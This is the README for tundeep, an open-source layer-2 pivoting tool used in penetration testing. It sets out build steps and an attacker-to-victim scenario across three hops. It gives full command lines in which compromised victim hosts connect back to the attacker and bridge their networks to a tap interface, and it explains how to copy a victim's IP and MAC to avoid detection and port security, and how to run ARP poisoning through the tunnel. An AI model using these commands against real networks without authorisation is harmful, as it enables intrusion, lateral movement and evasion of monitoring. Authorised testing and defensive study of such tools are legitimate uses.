# TUNDEEP
## Adam Palmer


    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.


* __Name__:         tundeep v1.0
* __Author__:       [Adam Palmer (npn)](https://www.adampalmer.me/) (adam@adampalmer.me)
* __README__:       https://www.adampalmer.me/iodigitalsec/tundeep/

  > Source: http://www.cis.syr.edu/~wedu/seed/Labs/VPN/files/simpletun.c  
  > Source: Various stackoverflow posts  
  > Source: Libpcap documentation  
  > Source: Beej's Network Guide  
  > Source: http://www.logix.cz/michal/devel/ (getaddrinfo)  

Please direct questions, comments, criticism and bug reports to adam@adampalmer.me. 

### Contents:

  1. Purpose
  2. Installation
  3. Scenario
  4. Usage
    4a. TCP Mode
    4b. UDP Mode
    4c. IPv6 Mode
    4d. Misc
  5. Changelog
  6. The future

### 1. Purpose:

  This is a network tunnelling tool. 

  For pivoting/tunnelling deeper into a target network, we have a couple of options;

  * Option 1 - Metasploit's `autoroute` module. Disadvantages: Works great, but only works from within metasploit. No use for running external tools.
  * Option 2 - Metasploit's portfwd module/iptables/simpleproxy. Disadvantages: Only forwards specified single layer 3 UDP/TCP ports.
  * Option 3 - Proxychains/ssh `-D SOCKS` tunnelling. Disadvantages: Proxychains is a hack in itself, and only supports layer 3 TCP.
  * Option 4 - Implement a VPN server and set up bridging on your victim. Disadvantages: disasterous idea

  This tool presents a `tap0` interface for your target network on your local machine. On the target end, it does not require `drivers/kernel`
modules to be installed beyond libpcap. This tool supports ARP and ARP scanning/poisoning on your target network no matter how many layers deep you tunnel. 

  This tool should support any layer 2 ethernet protocol. Code has been borrowed from various sources including those above. As we have a tap interface now bound to the
remote network, we are able to run any tools that we wish, as if we were directly connected to the target network.


### 2. Installation:

  `-D_LINUX` adds tun/tap support in the makefile, `-D_COMPRESS` adds zlib compression support

  Tested on Debian Squeeze 32bit and 64bit, and Windows XP Pro. This tool requires `libpcap`/`winpcap`

  On Windows, you'll need `Cygwin` and all the relevant tools such as `libc`, `make`, `gcc`.

  On Windows:

  * [Untested] Guide to winpcap silent install: http://paperlined.org/apps/wireshark/winpcap_silent_install.html
  * [Tested] libwpcap support in cygwin: http://mathieu.carbou.free.fr/wiki/?title=Winpcap_/_Libpcap

  To compile and run on Kali:

      apt-get install zlib1g-dev libpcap-dev
      git clone https://github.com/iodigitalsec/tundeep
      cd tundeep
      make
      ./tundeep

  You can change debug levels via the `DEBUG` variable in `def.h`


### 3. Scenario:

  `[Attacker 192.168.200.40 (eth0)]-----[192.168.200.41(eth0) VICTIM 1 10.0.0.5(eth1)]------[10.0.0.10(eth0) VICTIM2 10.10.10.20(eth1)]--------[10.10.10.21(eth0) VICTIM3]`

  This tool will bring up a `tap0` interface on the attacking machine, tunnelled via packet injection on the remote end to the target network.

  We have two main strategies. Looking at the scenario above, our first step is to pivot onto the `10.0.0.5` interface of Victim 1. We have two options:

  1. Match Victim1's eth1 IP and MAC exactly on our own `tap0` interface specifying `-x`, `-y` and `-u` on the attacking machine. This is the least detectable as it does not bring up any new IP or MAC addresses on the target network and we can evade port security. It may however interfere with legitimate traffic on Victim 1. 
  2. The second option is to assign our own IP and/or MAC to be tunnelled through. This is going to be more reliable, but less stealthy and may trigger IDS/switch/port security alerts.

  The next consideration is that all traffic that Victim1 receives on eth1 is tunnelled back to us. This will create network congestion at minimum, and service unavailability or worse. 
  It's not advisable to run this on a heavy traffic production environment. Also consider where you run this tool from. Running this where the connection between attacker and victim1's `eth0` is slower than victim1's eth1 and it's peers is a bad idea.

  The final option if this is really a problem, is using the bpf. I can think of two useful cases for the bpf:
  1. Specify a new IP to bring up on the target network via `-x`/`-y` and on both sides use `-b "host $ip"`.
  2. Retain the Victim's IP, and use `"tcp port $port"` on both sides to specify a particular port you wish to tunnel through.


### 4. Usage:

#### 4a. TCP Mode:


On our attacking machine -
1.
       tundeep -s -t tap0 -h 0.0.0.0 -p 5000 -x 10.0.0.5 -y 255.255.255.0 -u 00:0c:29:c6:44:02

	Here we will bring up a tap0 interface on our machine with the same MAC (-u) and IP/Mask (-x/-y) as the network we want to pivot to (Victim1's eth1).

	On our victim 1: `tundeep -i eth1 -h 192.168.200.40 -p 5000 -c`	Connect back to our attacker on port 5000.

	We can now `ping 10.0.0.10`, i.e. victim2 directly from our machine. TCP/UDP/ICMP and ARP have all been tested. 

2. 	Now to tunnel deeper. On our attacking machine:

	    tundeep -s -t tap1 -h 0.0.0.0 -p 5001 -x 10.10.10.20 -y 255.255.255.0 -u 00:0c:29:df:f0:ac

	Here we will bring up a tap1 interface on our attacking machine, with the same MAC/IP as Victim 2's eth1
	On our victim 2: `tundeep -i eth1 -h 10.0.0.5 -p 5001 -c`

	Now we can `ping 10.10.10.21`, i.e. victim 3. We can continue tunnelling as deep as we need.


#### 4b. UDP Mode:

  There's no client and server side. Each side needs it's endpoint specified via -e and it's listen IP via `-h`. 
  To use the scenarios above. On our side:

  1.
         tundeep -d -e 192.168.200.41 -t tap0 -h 0.0.0.0 -p 5000 -x 10.0.0.5 -y 255.255.255.0 -u 00:0c:29:c6:44:02

      and on the victim:

         tundeep -d -e 192.168.200.40 -i eth1 -h 0.0.0.0 -p 5000

  2.
          tundeep -d -e 10.0.0.10 -t tap1 -h 0.0.0.0 -p 5001 -x 10.10.10.20 -y 255.255.255.0 -u 00:0c:29:df:f0:ac

     and on the victim:

          tundeep -d -e 10.0.0.5 -i eth1 -h 192.168.200.40 -p 5001

#### 4c. IPv6 Mode:

  There are two methods to utilize IPv6. The sniffing and injection portion works at layer 2 and is therefore IP version independant.
  Specifying -T on the tap node specifies IPv6 address usage. In that case -x specifies the IPv6 IP and -y specifies the prefix length.
  i.e. `./tundeep -T tap0 -h 0.0.0.0 -p 5000 -s -x fe80::80aa:2aff:fe0b:383f -y 64`
  Using this option, we can tunnel IPv6 over an existing IPv4 socket/network.

  The next option is in tunneling IPv4 over an existing IPv6 network, `-6` option puts the socket into IPv6 mode:

    `./tundeep -T tap0 -h "::0" -p 5000 -s -x 192.168.5.5 -y 255.255.255.0`

  Of course, -T and -6 can be used together for full IPv6.


#### 4d. Misc:

### 5. Changelog:

  tundeep v0.1a (2013-09-10):
  - Initial Release

  tundeep v0.2a (2013-09-16):
  - IPv6 support (-6, -T)
  - Compression support (-C) - must be enabled on both sides
  - Better error checking and debugging
  - Misc bug fixes and code improvements
  - Makefile improvements to detect Cygwin/Linux without manual edits
  - README updates
  - Added default checksum feature (-K disables) - added overhead, improved reliability. Must be disabled on both sides

### 6. The Future:

Future release plans:
- Code cleanup
- MAC/IP mangling support
